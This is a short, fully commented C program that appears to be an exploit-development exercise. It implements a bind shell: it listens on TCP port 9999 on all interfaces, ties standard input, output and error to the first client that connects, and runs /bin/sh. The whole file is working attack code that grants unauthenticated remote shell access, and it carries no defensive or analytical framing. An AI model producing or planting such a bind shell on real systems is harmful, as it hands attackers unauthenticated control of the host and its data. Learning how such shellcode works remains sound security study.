#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 

int server_sockfd;    // file descriptor for the server
int client_sockfd;  // file descriptor for the client

struct sockaddr_in serveraddr;  // create a new server listen address 'serveraddr' of the structure 'sockaddr_in'

int main() 
{ 
    // Create a new TCP socket 
    server_sockfd = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    serveraddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    serveraddr.sin_port = htons(9999);                // server port, converted to network byte order
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order
    
    // Bind socket to IP/Port in sockaddr struct 
    bind(server_sockfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr)); 
    
    // Listen for incoming connections 
    listen(server_sockfd, 2); 
    
    // Accept incoming connections
    client_sockfd = accept(server_sockfd, NULL, NULL); 
    
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockfd, 0); 
    dup2(client_sockfd, 1); 
    dup2(client_sockfd, 2); 
    
    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL);
    
    // Close the socket descriptor
    close(server_sockfd); 
    
    return 0;
}